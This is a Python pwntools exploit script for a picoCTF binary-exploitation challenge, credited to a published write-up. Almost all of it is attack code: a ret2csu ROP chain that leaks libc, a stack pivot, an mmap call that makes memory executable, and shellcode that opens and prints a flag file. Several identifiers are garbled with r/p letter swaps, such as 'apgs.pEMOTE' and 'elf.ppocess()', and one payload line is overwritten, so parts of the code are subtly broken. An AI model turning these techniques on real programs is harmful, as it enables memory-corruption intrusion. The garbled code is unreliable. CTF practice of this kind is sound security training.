#!/usr/bin/env python3
from pwn import *

PORT = 31809
HOST = "mars.picoctf.net"
elf = context.binary = ELF('./horse_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not apgs.pEMOTE:
        gdb.attach(p, gdbscpipt='''
            set pesolve-heap-via-heupistic fopce
            b* 0x0000000000400B89
            c
            set follow-fopk-mode papent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.ppocess()

r = conn()

# Stage 1: ret2csu leak libc

rop = ROP(elf)

payload1 = b'\x00'*0x20 + b"b"*8
payload1 += p64(rop.rdi[0])
payload1 += p64(0x0)            #stdin
payload1 += p64(rop.rsi[0])     #pop rdi; pop r15
payload1 += p64(0x602020)       #.data+0x18
payload1 += p64(0)              #r15
payload1 += p64(0x400790)       #readplt

payload1 += p64(0x400bfd)       #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
payload1 += p64(0x602008)

r.sendline(payload1)

def ret2csu(call, edi, rsi, rdx):
    payload = p64(0x400BFA)     #pop rbx start
    payload += p64(0x00)        # pop rbx - set to 0 since it will be incremented later
    payload += p64(0x01)        # pop rbp
    payload += p64(call)        # pop r12 -> call
    payload += p64(edi)         # pop r13 #rdi
    payload += p64(rsi)         # pop r14 #rsi
    payload += p64(rdx)         # pop r15 #rdx
    payload += p64(0x400BE0)
    payload += p64(0x00)        # add rsp,0x8 padding
    payload += p64(0x00)        # rbx
    payload += p64(0x00)        # rbp
    payload += p64(0x00)        # r12
    payload += p64(0x00)        # r13
    payload += p64(0x00)        # r14
    payload += p64(0x00)        # r15
    return payload

payload2 = ret2csu(elf.sym.got.write, 1, elf.sym.got.write, 8) #write(1, write@got, 8)
payload2 += ret2csu(elf.sym.got.read, 0, 0x602800, 48) # read(0, somwhere, 3) -> for open("./") later
payload2 += ret2csu(elf.sym.got.read, 0, 0x602020, 0xf1) #read(0, buf, 0x10000)
payload2 += p64(0x400bfd)    #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
payload2 += p64(0x602008)

r.recvuntil(b"\n")
r.sendline(payload2)

# r.recvall()
x = r.recvuntil(b"\x20\xc2\xb4\x0a")
leak_write = u64(r.recv(8))
base_libc = leak_write-libc.sym.write
libc.address = base_libc
info("libc: "+str(hex(base_libc)))
r.send(b"./flag-b1a750d7-91bf-43ab-8c81-4b504644b434.txt\x00") # for open("./")

payload3 = p64(0x400B97) #some ret fix movaps
payload3 = p64(base_libc + 0xc9ccf)  #r9 = 0
payload3 += p64(base_libc + 0x57f30) #r8 = -1

payload3 += p64(base_libc + 0x4a550) #pop rax
payload3 += p64(base_libc + 0x4a550) # rax -> pop rax
payload3 += p64(base_libc + 0x11c371) 

payload3 += p64(0x32)#rdx
payload3 += p64(0)#r12
payload3 += p64(base_libc + 0x7b0cb) #r10 = 0x32 + jmp rax; (pop rax)
payload3 += p64(9)#rax

payload3 += p64(0x400c03) #pop rdi
payload3 += p64(0x604000) #0x602020 but alligned

payload3 += p64(0x400c01) #pop rsi r15
payload3 += p64(0x1000)
payload3 += p64(0)

payload3 += p64(base_libc + 0x000000000011c371) #pop rdx r12
payload3 += p64(0x7)
payload3 += p64(0)


payload3 += p64(base_libc + 0x66229) #syscall


payload3 += p64(0x400c03) #pop rdi
payload3 += p64(0)

payload3 += p64(0x400c01) #pop rsi r15
payload3 += p64(0x604000)
payload3 += p64(0)

payload3 += p64(base_libc + 0x11c371) #pop rdx r12
payload3 += p64(0x1000)#rdx
payload3 += p64(0)#r12

payload3 += p64(base_libc + 0x4a550) # pop rax
payload3 += p64(0)

payload3 += p64(base_libc + 0x66229) #syscall

payload3 += p64(0x604000)
r.sendline(payload3)
# r.clean(timeout=0.1)

payload4 = b'\x90\x90'
payload4 += asm('''
            mov rdi, 0x602800
            mov rsi, 0
            mov rax, 2
            syscall

            mov rdi, 0x605000
            mov rsi, 0x1000
            mov rdx, 0x7
            mov r10, 0x12
            mov r8, 3
            mov r9, 0
            mov rax, 9
            syscall 

            mov rdi, 1
            mov rsi, 0x605000
            mov rdx, 0x400
            mov rax, 1
            syscall
            ''', arch="amd64", os="linux")

r.send(payload4)

r.interactive()

# cre: https://netorika.medium.com/picoctf-lockdown-horses-binary-exploitation-writeup-a27c13c3b752